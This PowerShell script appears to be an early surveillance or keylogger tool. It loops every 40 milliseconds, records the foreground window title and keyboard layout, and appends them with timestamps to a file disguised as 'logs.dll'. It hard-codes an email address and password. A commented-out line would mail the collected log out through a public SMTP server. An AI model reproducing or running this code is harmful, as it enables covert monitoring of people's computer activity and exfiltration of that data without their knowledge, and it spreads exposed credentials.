
# Custom
$global:key_email = "blabla.97@internet.ru"
$global:key_emailp = "zc4qT8QwbaKsxrJUjxym"
$global:temp_dir = ($env:Temp + "\lehR")

#Add-Content -Path C:\Users\me\AppData\Local\Temp\lehRP\lel.txt "kek"

# Uhuh
# Send-MailMessage -From $email -To $email -Subject "test3" -Attachment .\$mail_attach -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, $emailp)


$csharp  = @"
  using System;
  using System.Runtime.InteropServices;
  using System.Text;

  public class WinAPI {
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true)]
    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    [DllImport("user32.dll")]
    public static extern IntPtr GetKeyboardLayout(uint idThread);
  }
"@

# You know
Add-Type -TypeDefinition $csharp -Language CSharp



while ($true) {
  # give time for...you know
  Start-Sleep -Milliseconds 40

  # Get the handle for foreground
  $global:fg_handle = [WinAPI]::GetForegroundWindow();


  # Ignore
  $global:dummyprocessid = 0


  # if it doesn't exist
  if (-Not ($global:fg_handle -eq [System.IntPtr]::Zero)) {

    # For window's text
    $global:fg_thread_id = [WinAPI]::GetWindowThreadProcessId($global:fg_handle, [ref]$global:dummyprocessid)
    $global:fg_str_build = New-Object System.Text.StringBuilder 256

    # For layout
    $global:key_layout = [WinAPI]::GetKeyboardLayout($global:fg_thread_id)

    # Finally, the title
    $global:fg_title_length = [WinAPI]::GetWindowText($global:fg_handle, $global:fg_str_build, $global:fg_str_build.Capacity)
    $global:fg_curr_title = $global:fg_str_build.ToString()

    #Write-Host "$global:fg_curr_title and $global:key_layout"

    $global:date = Get-Date
    Add-Content -Path ./logs.dll -Value "\n [ $global:fg_curr_title at $global:date ]"
  }
}
